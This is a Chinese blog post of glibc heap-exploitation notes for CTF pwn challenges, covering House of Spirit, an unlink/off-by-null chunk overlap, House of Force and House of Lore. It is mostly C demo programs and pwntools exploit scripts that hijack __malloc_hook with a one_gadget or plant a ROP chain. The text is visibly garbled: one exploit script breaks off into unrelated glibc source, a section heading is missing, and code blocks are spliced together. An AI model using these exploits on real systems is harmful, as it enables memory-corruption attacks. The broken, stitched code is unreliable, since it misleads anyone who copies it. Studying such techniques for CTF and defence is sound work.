---
title: "House of 系列堆利用"
date: 2025-07-01
categories:
  - 二进制安全
  - 堆利用
tags:
  - pwn
  - heap
  - house-of-spirit
---

模板都是ai给的例子，小修改了一下

## 1.House of spirit
骗过分配器把假chunk分配给fastbin

### 漏洞成因
堆溢出

### 版本范围
2.23——至今

### 利用原理
堆溢出修改size,伪造fake chunk ,然后通过对堆块的释放和排布。控制fake chunk

申请A,B,C,D

对A进行溢出，修改B的范围，让它包括C。

释放B，申请B，然后再释放C，然后我们可以通过修改B的内容，控制C

### 注意
新版是tcachebin，需要改一下。

我们劫持tcachebin/fastbin的fd以后，可以分配读写任意地址

### 模板：
```c
#include 
#include 

int main() {
    // ---------------------------------------------------
    // 1. 内存布局构造 (模拟栈上的情况)
    // 我们定义一个结构体，确保内存是连续分配的。
    // 在真实的 Pwn 场景中，这些数据通常是通过溢出或任意写布置在栈上的。
    // ---------------------------------------------------
    struct {
        unsigned long long prev_size;
        unsigned long long size;        // Fake Chunk 的大小
        char data[0x40];                // 分配后供用户写入的区域 (大小为 64 字节)
        unsigned long long target;      // 【目标变量】我们想要篡改的值
        unsigned long long next_prev_size;
        unsigned long long next_size;   // Next Chunk 的大小 (用于绕过检查)
    } fake_stack_layout __attribute__ ((aligned (16))); // 确保 16 字节对齐

    // 初始化目标变量为一个安全的值
    fake_stack_layout.target = 0xdeadbeef;
    printf("[*] 初始 Target 变量的值: 0x%llx\n", fake_stack_layout.target);

    // ---------------------------------------------------
    // 2. 伪造 Chunk Metadata (头部信息)
    // ---------------------------------------------------
    // 我们想申请 0x40 的数据区，加上 0x10 的 header，总 chunk 大小为 0x50
    fake_stack_layout.prev_size = 0;
    fake_stack_layout.size = 0x50; 

    // 伪造 Next Chunk 的 size，必须满足 2*SIZE_SZ system_mem
    // 这是 House of Spirit 成功绕过 glibc 安全检查的关键
    fake_stack_layout.next_size = 0x1234; 

    // ---------------------------------------------------
    // 3. 触发 House of Spirit 攻击
    // ---------------------------------------------------
    // 计算传给 free 的指针（必须指向 chunk 的 data 区域首地址）
    void *fake_ptr = &fake_stack_layout.data;
    
    printf("[*] 正在将栈上的伪造指针 %p 传入 free()...\n", fake_ptr);
    // 此时 glibc 会检查 fake_ptr 附近我们伪造的 size 和 next_size
    // 检查通过后，这个栈地址会被放入 0x50 大小的 fastbin 链表中
    free(fake_ptr); 

    // ---------------------------------------------------
    // 4. 再次分配，接管栈区
    // ---------------------------------------------------
    printf("[*] 正在调用 malloc(0x40) 重新申请内存...\n");
    // glibc 发现 0x50 的 fastbin 中刚好有一个空闲块（就是我们刚释放的栈地址），直接返回给我们
    void *vuln_ptr = malloc(0x40); 
    printf("[*] Malloc 返回的地址: %p\n", vuln_ptr);

    // ---------------------------------------------------
    // 5. 实施篡改
    // ---------------------------------------------------
    if (vuln_ptr == fake_ptr) {
        printf("[+] 成功骗过分配器，拿到了栈上的地址！\n");
        
        // 我们通过拿到的堆指针往里写数据，越界覆盖掉 target
        // 0x40 bytes = 8 个 unsigned long long，所以第 9 个元素正好是 target 的位置
        unsigned long long *exploit_ptr = (unsigned long long *)vuln_ptr;
        exploit_ptr[8] = 0xcafebabe; // 恶意覆盖
        
        printf("[*] 篡改后的 Target 变量的值: 0x%llx\n", fake_stack_layout.target);
        printf("[+] House of Spirit 攻击演示完成！\n");
    } else {
        printf("[-] 攻击失败，返回的地址不匹配。\n");
    }

    return 0;
}
```

exp脚本

```python
from pwn import *

# =========================================================
# 1. 环境配置与初始化
# =========================================================
# context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

elf = ELF('./pwn_challenge')
# libc = ELF('./libc.so.6') 

io = process('./pwn_challenge')
# io = remote('x.x.x.x', 1337)

# =========================================================
# 2. 交互辅助函数 (根据目标程序的菜单进行封装)
# =========================================================
def add(size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Content: ", content)

def delete(index):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())

def trigger_vuln_free(addr):
    # 假设程序有一个特定的漏洞点，允许你释放任意一个地址
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Address to free: ", str(addr).encode())

# =========================================================
# 3. 核心攻击逻辑
# =========================================================
def exploit():
    # --- 阶段一：信息泄露 (假设我们已经通过某种方式泄露了栈地址和 libc 基址) ---
    # 真实场景中，由于存在 ASLR，你需要先 leak 出栈地址，才能知道伪造 chunk 的确切位置
    stack_leak = 0x7fffffffe000 # 假设这是泄露出的栈上某变量的地址
    target_ret_addr = stack_leak + 0x20 # 计算出当前函数返回地址所在的精确栈位置

    log.success(f"Target Return Address: {hex(target_ret_addr)}")

    # --- 阶段二：在栈上构造 Fake Chunk ---
    # 我们打算在 target_ret_addr 的上方一点伪造 chunk header
    # 假设目标大小为 0x50 (包含 header)，对应 malloc(0x40)
    fake_chunk_addr = target_ret_addr - 0x10 # Fake chunk 的起始地址 (prev_size 的位置)
    fake_chunk_mem  = fake_chunk_addr + 0x10 # 传给 free 的地址 (data 区域的起始位置)

    # 构造 Fake Chunk Payload
    # 假设我们通过栈溢出或格式化字符串漏洞，能往栈上写入这些数据
    payload = flat([
        0,                  # prev_size
        0x50,               # size (当前 chunk 大小，放入 0x50 的 fastbin)
        b'A' * 0x40,        # data 区域的填充物
        0,                  # next_prev_size
        0x1234              # next_size (必须满足检查: 2*SIZE_SZ fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {								      \
		// .....							      \
      }									      \
}
```

只需要绕过__builtin_expect (FD->bk != P || BK->fd != P, 0) 即可，因此，不需要伪造地址处于高位的 chunk 的 presize 域。

高版本的unlink

```c
/* Take a chunk off a bin list.  */
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;

  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");
	// ......
}

```

新增了这一行做检查：

```c
chunksize (p) != prev_size (next_chunk (p))
```

伪造的时候需要绕过

### 模板：
```c
#include 
#include 
#include 
#include 

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] 正在分配 Chunk A, B, C, D...\n");
    // 分配大小需在 unsorted bin 范围内 (大于 fastbin 大小，通常 > 0x80)
    char *a = malloc(0xf8); 
    char *b = malloc(0xf8); // 受害者 Chunk
    char *c = malloc(0xf8); 
    char *d = malloc(0x10); // 隔离 Top Chunk 的 Gap

    printf("Chunk A 地址: %p\n", a);
    printf("Chunk B 地址: %p\n", b);
    printf("Chunk C 地址: %p\n", c);
    printf("Chunk D (Gap) 地址: %p\n", d);

    // 1. 释放 A，使其进入 unsorted bin
    printf("\n[*] 释放 Chunk A...\n");
    free(a);

    // 2. 核心：在 B 中触发 Off-By-Null 漏洞
    printf("[*] 模拟向 Chunk B 写入数据，触发 Off-By-Null...\n");
    // 伪造 C 的 prev_size。A(0x100) + B(0x100) = 0x200 (这里是包含 header 的大小)
    // 假设程序有漏洞，允许我们在 B 的末尾写 prev_size
    *(unsigned long long *)(b + 0xf0) = 0x200; 

    // 触发单字节溢出，覆盖 C 的 P 位为 0 (0x101 -> 0x100)
    // 真实的漏洞可能是 strcpy 或者 read 导致的 off-by-null
    b[0xf8] = '\x00'; 
    printf("[+] 成功篡改 Chunk C 的 prev_size 和 P 位。\n");

    // 3. 释放 C，触发向后合并
    printf("\n[*] 释放 Chunk C，触发合并 (Backward Coalescing)...\n");
    free(c); 
    printf("[+] 合并完成！现在 A, B, C 已经合并为一个 0x300 大小的 Unsorted Bin Chunk。\n");

    // 4. 利用 Overlapping
    printf("\n[*] 重新申请一块大的内存 (覆盖 A 和 B)...\n");
    char *overlap = malloc(0x1f8); // 申请大小足以跨越 A 并覆盖到 B
    
    // 我们向新的 chunk 写入特定的特征码
    strcpy(overlap + 0x100, "YOU_ARE_HACKED_VIA_OVERLAPPING!");

    // 此时程序依然认为 b 是合法的指针，并打印 b 的内容
    printf("[!] 读取受害者 Chunk B 的内容: %s\n", b);

    return 0;
}
```

exp

```python
from pwn import *

# 初始化
context.arch = 'amd64'
context.log_level = 'debug'
# io = process('./pwn_challenge')

# --- 假设程序有标准的增删改查菜单 ---
#这里根据实际程序里的逻辑替换
def add(size, content=b"a"):
    pass # 封装交互逻辑
def delete(idx):
    pass
def edit(idx, content):
    pass
def show(idx):
    pass

def exploit():
    # 1. 申请 A, B, C, D
    # 大小选择 > 0x80 以便进入 unsorted bin
    add(0xf8) # idx 0: Chunk A
    add(0xf8) # idx 1: Chunk B
    add(0xf8) # idx 2: Chunk C
    add(0x10) # idx 3: Chunk D (Gap)

    # 2. 释放 A
    delete(0)

    # 3. 利用 B 的编辑功能，触发 Off-By-Null
    # 假设 edit 会在末尾补 \x00，或者存在溢出
    # 我们需要精算 prev_size，这里 A 的大小是 0x100，B 的大小也是 0x100
    # 所以 C 前面的空闲块总大小应该是 0x200
    prev_size = 0x200

    # 构造 payload：填充 B 的数据区 -> 写入 C 的 prev_size -> 触发 \x00 覆盖 C 的 P 位
    payload = b'B' * 0xf0
    payload += p64(prev_size)

    # 向 B 写入 payload 并触发溢出
    edit(1, payload) 
    log.info("Off-by-null triggered, C's PREV_INUSE cleared.")

    # 4. 释放 C，触发堆叠重叠 (A+B+C 合并)
    delete(2)
    log.success("Chunks A, B, C successfully coalesced!")

    # 5. 实现 Overlapping 利用
    # 现在申请一个大 chunk，它将从原 A 的位置开始分配，一直覆盖到 B
    # 我们可以通过写入这个新 chunk，直接篡改依然在使用中的 Chunk B 的数据或结构
    add(0x1f8, b'A' * 0x100 + b"HACKED_DATA") # idx 4

    # 此时如果调用 show(1) 查看 B，就会输出 "HACKED_DATA"
    # 或者如果进一步修改 B 的 fd 指针，就可以继续展开 Fastbin Attack 等

    # io.interactive()

if __name__ == '__main__':
    exploit()
```

高版本伪造跳过检查逻辑：

在过去（比如 glibc 2.23），你只需要伪造头部和 `fd/bk`：

```plain
Fake_P:
  [ prev_size ] = 0
  [ size      ] = FAKE_SIZE
  [ fd        ] = target_addr - 0x18
  [ bk        ] = target_addr - 0x10
```

现在（高版本 glibc），你必须在内存布局上多布置一块数据：

```plain
Fake_P:
  [ prev_size ] = 0
  [ size      ] = FAKE_SIZE
  [ fd        ] = target_addr - 0x18
  [ bk        ] = target_addr - 0x10
  ... (中间填充物) ...

Fake_P + FAKE_SIZE:  prev_size
    FAKE_SIZE,          # p->size
    target_addr - 0x18, # p->fd  (绕过 unlink 双向链表检查)
    target_addr - 0x10  # p->bk
])

# 2. 填充数据，直到达到 next_chunk 的 prev_size 位置
# 减去头部 4 个 QWORD (0x20)
payload = payload.ljust(FAKE_SIZE, b'\x00') 

# 3. 构造 Next Chunk 的 prev_size 和 size 
payload += flat([
    FAKE_SIZE,          # next_chunk(p)->prev_size (完美绕过新增的检查！)
    0x21                # next_chunk(p)->size (给个合法大小，P位=1)
])

# 发送 payload 覆盖内存...
```

### 效果
可以结合其它方法，任意地址读写

任意地址分配

## 3.House of Force
首先注意在glibc2.29以后，这个方法基本失效

Force操作的是Top_chunk。 它利用无符号整数溢出的特性，强行将 Top Chunk 的指针移动到内存中的任意位置，从而实现任意地址分配。  

### 条件
有可分配任意大小的chunk

需要泄露或已知地址(提前通过UAF来泄露base)

### glibc的限制
在2.29之后加了对top_chunk大小检查的逻辑，使Froce基本失效

```python
if (__glibc_unlikely (size > av->system_mem))
    malloc_printerr ("malloc(): corrupted top size");
```

这样force就不能把top_chunk的size改成很大一块空间，然后去像改哪就改哪

### 利用流程
申请A

写A的时候溢出，把top_chunk的size改成很大的数

然后分配很大的chunk到任意地址

### 效果
任意地址分配，任意地址读写

### 模板
```c
#include 
#include 
#include 
#include 

// 模拟我们的攻击目标，存放在 .bss 段
char target_bss_var[0x20] = "SAFE_DATA"; 

int main() {
    printf("[*] 初始 Target 变量内容: %s\n", target_bss_var);
    printf("[*] Target 变量地址: %p\n", target_bss_var);

    // 1. 分配一个靠近 Top Chunk 的堆块
    intptr_t *ptr = malloc(0x10);
    // 推算出当前 Top Chunk 的地址 (当前 chunk 首地址 + chunk 大小 0x20)
    intptr_t top_chunk_addr = (intptr_t)ptr + 0x10; 
    printf("[*] 当前 Top Chunk 地址推算为: 0x%lx\n", top_chunk_addr);

    // 2. 模拟堆溢出漏洞，篡改 Top Chunk 的 size
    printf("\n[*] 触发堆溢出，修改 Top Chunk Size 为 0xffffffffffffffff...\n");
    intptr_t *top_chunk_size_ptr = (intptr_t *)(top_chunk_addr + 0x8);
    *top_chunk_size_ptr = -1; // 强行覆盖 size

    // 3. 计算跨越的偏移量 (offset)
    // 公式: offset = target_addr - top_chunk_addr - 0x20
    intptr_t target_addr = (intptr_t)&target_bss_var;
    intptr_t offset = target_addr - top_chunk_addr - 0x20;
    printf("[*] 计算出的恶意偏移量 (offset): 0x%lx\n", offset);

    // 4. The "Force" Malloc 跨越内存
    printf("[*] 正在 malloc(offset) 强行移动 Top Chunk 指针...\n");
    malloc(offset);

    // 5. 再次分配，拿到目标地址
    printf("\n[*] 再次 malloc(0x10)，分配器将返回目标地址...\n");
    char *hacked_ptr = malloc(0x10);
    printf("[+] Malloc 返回的指针: %p\n", hacked_ptr);

    if (hacked_ptr == target_bss_var) {
        printf("[+] 成功接管 Target 地址！正在写入恶意数据...\n");
        strcpy(hacked_ptr, "HACKED_BY_FORCE!!");
        printf("[!] 最终 Target 变量内容: %s\n", target_bss_var);
    } else {
        printf("[-] 劫持失败。返回的指针不匹配。\n");
    }

    return 0;
}
```

exp

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# io = process('./pwn_challenge')
# libc = ELF('./libc.so.6')

def exploit():
    # ==== 阶段 1：信息泄露 (假设已通过常规漏洞完成) ====
    heap_base = 0x555555757000           # 泄露的堆基址
    libc_base = 0x7ffff7a0d000           # 泄露的 libc 基址

    # 计算 Top Chunk 的精确地址
    # 假设我们之前一共申请了 0x30 大小的内存 (包含 header)
    top_chunk_addr = heap_base + 0x30    

    # 计算目标地址: __malloc_hook
    # malloc_hook_addr = libc_base + libc.sym['__malloc_hook']
    malloc_hook_addr = 0x7ffff7dd1b70    # 假设计算出的真实地址

    # 准备后门地址或 one_gadget (这里以 one_gadget 为例)
    one_gadget_addr = libc_base + 0x4f322

    log.success(f"Top Chunk Address: {hex(top_chunk_addr)}")
    log.success(f"__malloc_hook Address: {hex(malloc_hook_addr)}")

    # ==== 阶段 2：触发溢出，篡改 Top Chunk Size ====
    # 假设有一个 edit 函数存在堆溢出
    # 向最后一个 chunk 写入数据，溢出覆盖相邻的 Top Chunk header
    payload = b'A' * 0x18        # 填满当前 chunk 的数据区
    payload += p64(0xffffffffffffffff) # 覆盖 Top Chunk 的 size 为 -1

    # edit(idx, payload)
    log.info("Top Chunk size overwritten with -1")

    # ==== 阶段 3：计算并跨越内存 ====
    # 公式: offset = target - top_chunk - 0x20
    offset = malloc_hook_addr - top_chunk_addr - 0x20

    # 因为是在 64 位无符号环境中，负数会自动转换为巨大的正数，可以直接传给 add()
    # add(offset, b"B") 
    log.info(f"Forced malloc with offset: {hex(offset)}")

    # ==== 阶段 4：劫持控制流 ====
    # 此时 Top Chunk 已经悬停在 __malloc_hook 上方
    # 再次申请一个正常的 chunk，返回的地址就是 __malloc_hook
    # 我们直接把 one_gadget 写入这个地址
    # add(0x10, p64(one_gadget_addr))
    log.success("__malloc_hook overwritten with one_gadget!")

    # ==== 阶段 5：触发 Shell ====
    # __malloc_hook 已经被篡改，此时程序中任何一次 malloc() 调用都会直接去执行 one_gadget
    # add(0x10, b"Trigger!") 

    # io.interactive()

if __name__ == '__main__':
    exploit()
```


## 4.House of lore
针对small_bin的经典攻击技术

 篡改 Small Bin 链表中空闲堆块的 `bk`（后向指针），欺骗内存分配器，使其在后续的分配中，将我们伪造的非堆内存（如栈或 `.bss` 段）当作正常的 Small Bin Chunk 分配出来。  

### 漏洞原因
UAF，堆溢出

### 条件
需要已知或泄露地址

### 注意
1.这里glibc有一个检查

```python
bck = victim->bk;
if (__builtin_expect (bck->fd != victim, 0))
    malloc_printerr ("malloc(): smallbin double linked list corrupted");
```

2.glibc2.26以后引入了检查

```python
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache && tc_idx counts[tc_idx] bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &main_arena)
            set_non_main_arena (tc_victim);
              bin->bk = bck;
              bck->fd = bin;

              tcache_put (tc_victim, tc_idx);
                }
        }
        }
#endif
```

我们需要 把 Tcache 塞满。这样当分配器来到 Small Bin 时，一看 Tcache 满了，就会直接跳过这段 stashing 代码。

```plain
tcache->counts[tc_idx] >= mp_.tcache_count
```

### 利用流程
1. 申请A,B,C。B要能进入small_bin
2. 释放B，申请更大的chunk_D
3. 写A,修改B的bk,指向有fake_chunk的地址
4. 布置X->fd == &B
5. 分配两次就可以取出fake_chunk

### 模板
```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
# io = process('./pwn_challenge')

def exploit():
    # 假设通过前面的步骤，已经泄露了 堆基址(heap_base) 和 栈地址(stack_leak)
    victim_chunk_addr = heap_base + 0x10
    
    # 计算栈上伪造 chunk 的确切位置
    fake_chunk_addr = stack_leak - 0x50 
    fake_chunk_2_addr = fake_chunk_addr + 0x20 # 紧挨着放一个辅助 chunk
    # ==========================================
    # 1. 构造 Fake Chunk 数据 (需通过某种方式写入栈或 .bss)
    # ==========================================
    # 绕过 `bck->fd == victim` 检查
    payload = flat([
        0, 0,                  # prev_size, size
        victim_chunk_addr,     # fd = victim chunk head
        fake_chunk_2_addr,     # bk = fake_chunk_2
        # --- fake_chunk_2 ---
        0, 0,                  # prev_size, size
        fake_chunk_addr,       # fd = fake_chunk
        0                      # bk = 0
    ])
    # 假设通过栈溢出或任意写布置了上述 payload
    # io.sendafter("Enter stack data: ", payload)

    # ==========================================
    # 2. 制造 Small Bin 并触发漏洞
    # ==========================================
    # add(0x100) # idx 0: Victim
    # add(0x10)  # idx 1: Gap
    # delete(0)  # 进入 Unsorted Bin
    # add(0x120) # idx 2: 触发整理，Victim 掉入 Small Bin

    # 利用 UAF 或 Heap Overflow 修改 idx 0 的 bk
    # fd 保持原样 (填 0 或填真实的 bin 地址)，bk 修改为 fake_chunk_addr
    # edit(0, p64(0) + p64(fake_chunk_addr)) 

    # ==========================================
    # 3. 连续分配，劫持目标
    # ==========================================
    # 第一次 malloc 拿出原始的 victim
    # add(0x100) # idx 3
    
    # 第二次 malloc 拿到栈上的 fake chunk！
    # 写入 ROP 链覆盖返回地址
    # add(0x100, rop_chain_payload) # idx 4

    log.success("Control flow hijacked via House of Lore!")
    # io.interactive()

if __name__ == '__main__':
    exploit()
```

实际如果用fastbin和tcachebin比这个方便。因为不用管双向链表

## 5.House of Orange